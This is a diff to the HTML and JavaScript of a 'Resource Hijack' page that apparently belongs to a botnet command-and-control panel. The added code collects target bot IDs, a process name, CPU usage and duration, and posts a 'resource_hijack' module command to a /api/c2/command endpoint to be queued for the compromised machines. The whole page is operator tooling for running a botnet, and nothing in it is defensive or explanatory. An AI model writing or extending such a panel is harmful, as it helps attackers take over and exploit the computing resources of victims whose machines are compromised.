@@ -10,24 +10,124 @@
     <h1>Resource Hijack</h1>
     <div class="panel">
         <h2>Parameters</h2>
+        <input type="text" id="targets" placeholder="Target bot IDs (comma separated)">
         <input type="text" id="process_name" placeholder="Process Name">
         <input type="number" id="cpu_usage" placeholder="CPU Usage (%)">
         <input type="number" id="duration" placeholder="Duration (seconds)">
-        <button onclick="execute()">Hijack</button>
+        <button onclick="startHijack()">Start Hijack</button>
     </div>
     <div class="panel">
         <h2>Output</h2>
         <div id="output"></div>
     </div>
+    <div id="popup" class="popup hidden">
+        <div class="popup-content">
+            <p id="popup-message"></p>
+            <button onclick="closePopup()">Close</button>
+        </div>
+    </div>
+    <div id="run-popup" class="popup hidden">
+        <div class="popup-content">
+            <h3>Prepare to Run</h3>
+            <p id="run-popup-message"></p>
+            <p id="run-popup-feedback"></p>
+            <button onclick="triggerRunFromPopup()">Run</button>
+            <button onclick="closeRunPopup()">Cancel</button>
+        </div>
+    </div>
     <script>
+        const popup = document.getElementById('popup');
+        const popupMessage = document.getElementById('popup-message');
+        const runPopup = document.getElementById('run-popup');
+        const runPopupMessage = document.getElementById('run-popup-message');
+        const runPopupFeedback = document.getElementById('run-popup-feedback');
+        let pendingRunAction = null;
+
+        function showPopup(message, isError = false) {
+            popupMessage.textContent = message;
+            popup.classList.remove('hidden');
+            popup.classList.toggle('error', isError);
+        }
+
+        function closePopup() {
+            popup.classList.add('hidden');
+            popup.classList.remove('error');
+        }
+
+        function openRunPopup(message, action) {
+            pendingRunAction = action;
+            runPopupMessage.textContent = message || 'Click Run to execute this command.';
+            runPopupFeedback.textContent = '';
+            runPopup.classList.remove('hidden');
+        }
+
+        function closeRunPopup() {
+            runPopup.classList.add('hidden');
+            pendingRunAction = null;
+        }
+
+        function triggerRunFromPopup() {
+            if (typeof pendingRunAction === 'function') {
+                const timestamp = new Date().toLocaleTimeString();
+                runPopupFeedback.textContent = 'Run button clicked at ' + timestamp + '.';
+                alert('Run button clicked at ' + timestamp + '.');
+                const action = pendingRunAction;
+                closeRunPopup();
+                action();
+            }
+        }
+
+        function startHijack() {
+            openRunPopup('Ready to dispatch the resource hijack command.', execute);
+        }
+
+        function parseTargets() {
+            return document.getElementById('targets').value
+                .split(',')
+                .map(v => v.trim())
+                .filter(Boolean);
+        }
+
         function execute() {
-            const params = {
-                process_name: document.getElementById('process_name').value,
-                cpu_usage: parseInt(document.getElementById('cpu_usage').value),
-                duration: parseInt(document.getElementById('duration').value)
-            };
-            // Send command to C2 server
-            console.log('Executing with params:', params);
+            const targets = parseTargets();
+            if (!targets.length) {
+                showPopup('Please specify at least one target bot ID.', true);
+                return;
+            }
+
+            const cpu = parseInt(document.getElementById('cpu_usage').value, 10);
+            const duration = parseInt(document.getElementById('duration').value, 10);
+            const processName = document.getElementById('process_name').value.trim();
+
+            if (!processName || Number.isNaN(cpu) || Number.isNaN(duration)) {
+                showPopup('Process name, CPU usage, and duration are required.', true);
+                return;
+            }
+
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targets,
+                    command: JSON.stringify({
+                        module: 'resource_hijack',
+                        params: {
+                            process_name: processName,
+                            cpu_usage: cpu,
+                            duration,
+                        },
+                    }),
+                }),
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        showPopup('Hijack command queued for ' + targets.join(', '));
+                    } else {
+                        showPopup('C2 rejected command: ' + (data.message || 'unknown error'), true);
+                    }
+                })
+                .catch(err => showPopup('Failed to send command: ' + err, true));
         }
     </script>
 </body>
